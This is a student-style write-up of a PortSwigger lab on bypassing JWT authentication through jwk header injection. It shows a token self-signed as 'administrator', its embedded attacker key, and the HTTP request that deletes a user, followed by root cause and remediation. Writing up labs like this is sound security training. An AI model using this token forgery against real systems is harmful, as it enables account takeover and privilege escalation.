# JWT authentication bypass via jwk header injection

**Category:** Broken Authentication (JWT)  
**Difficulty:** ⭐⭐ (Practitioner)  
**Severity:** 🔴 Critical  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

---

## Description

This lab's authentication uses JWTs signed with the RS256 (RSA) algorithm. The server is misconfigured to trust an attacker-supplied public key embedded directly in the token's `jwk` header parameter, instead of using its own trusted key. By self-signing a forged token with our own RSA key pair and embedding the matching public key in the `jwk` header, we can impersonate any user — including `administrator` — and gain access to the admin panel.

---

## Discovery Process

**Step 1 — Login with the provided credentials**

Logged in to the application using the supplied account `wiener:peter`. This issues a valid session JWT that is used for subsequent authenticated requests.

> 📸 `screenshots/01-login.png`

**Step 2 — Inspect the issued JWT**

Captured a request in Burp and examined the JWT in the JWT Editor tab. The token header shows `"alg": "RS256"` with a `kid`, and the payload contains `"iss": "portswigger"`, an `exp` timestamp, and `"sub": "wiener"`. Attempting to access `/admin` as `wiener` returns `HTTP/2 401 Unauthorized`, confirming the admin area is restricted by the `sub` claim.

> 📸 `screenshots/02-jwt-original-401.png`

---

## Exploitation

**Step 3 — Generate a new RSA key and embed it via the jwk header**

Using the JWT Editor extension, generated a new RSA key. In Repeater, switched to the JSON Web Token tab, changed the payload's `"sub"` value to `"administrator"`, and used the **Attack → Embedded JWK** option to sign the token with the generated key and automatically embed the matching public key in the `jwk` header.

The forged token header now contains the attacker-controlled public key:

```json
{
  "kty": "RSA",
  "e": "AQAB",
  "kid": "7394f47b-187e-4afe-bdf4-b6bcc757ae40",
  "n": "qUMLNqXjmKR62Gqw9UHuWtjAZkbAT2TYDoJ3X8wJ8h2U59t..."
}
```

And the payload is modified to impersonate the admin:

```json
{
  "iss": "portswigger",
  "exp": 1782494962,
  "sub": "administrator"
}
```

> 📸 `screenshots/03-jwk-embedded-admin.png`

**Step 4 — Send the forged token to the admin endpoint**

Sent a request to `/admin` carrying the self-signed token in the session cookie. The server verified the signature against the embedded public key, accepted it as `administrator`, and returned `HTTP/2 200 OK` with the admin interface.

**Request sent:**

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0abf004204dc9de98026352200f800d3.web-security-academy.net
Cookie: session=eyJraWQiOiI3Mzk0ZjQ3Yi0xODdlLTRhZmUtYmRmNC1iNmJjYzc1N2FlNDAiLCJ0...
```

**Response received:**

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

> 📸 `screenshots/04-delete-carlos-302.png`

**Step 5 — Delete carlos and solve the lab**

With administrator access confirmed, requested `/admin/delete?username=carlos`. The server responded `302 Found` redirecting to `/admin`, deleting the user `carlos` and solving the lab.

> 📸 `screenshots/05-solved.png`

---

## Impact

- **Full authentication bypass** — Any user identity can be forged, since the server trusts a key supplied by the attacker rather than its own.
- **Privilege escalation to administrator** — An ordinary low-privilege user (`wiener`) escalates to `administrator` and reaches restricted functionality.
- **Account takeover and destructive actions** — Admin access allows deleting users (`carlos`) and performing any other privileged operation, leading to potential data loss and full application compromise.

---

## Root Cause

JWT signature verification exists to prove a token was signed by a key the server trusts. Here the server reads the public key from the token's own `jwk` header and verifies the signature against it. Because the attacker controls that header, they can supply their own key pair: the signature will always "verify" against the key they embedded, defeating the entire purpose of signing.

**Vulnerable flow:**

```text
attacker forges token + embeds own public key in jwk header → server verifies signature using the embedded (attacker) key → ❌ no check against a trusted key → token accepted as administrator
```

**Secure flow:**

```text
attacker forges token + embeds own public key in jwk header → server ignores untrusted jwk header, verifies against its own pre-configured public key → ✅ signature mismatch → token rejected
```

---

## Remediation

- **Never trust keys supplied inside the token** — Ignore the `jwk`, `jku`, and `kid` header parameters as a source of verification keys; verify only against a server-side allowlist of trusted public keys.
- **Pin the verification key** — Configure the application with a fixed, known public key (or a controlled key set) and reject any token whose signing key is not on that list.
- **Enforce the expected algorithm** — Explicitly require `RS256` (or the intended algorithm) and reject `none` and unexpected algorithm values to prevent related JWT bypasses.
- **Use a vetted JWT library securely** — Ensure the library does not auto-resolve embedded keys, and validate all standard claims (`iss`, `exp`, `sub`) server-side.

---

## Tools Used

- Burp Suite (Proxy & Repeater)
- JWT Editor Extension (RSA key generation + Embedded JWK attack)

---

## References

- <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection>
- <https://portswigger.net/web-security/jwt>
- RFC 7515 – JSON Web Signature (JWS)
- <https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/>
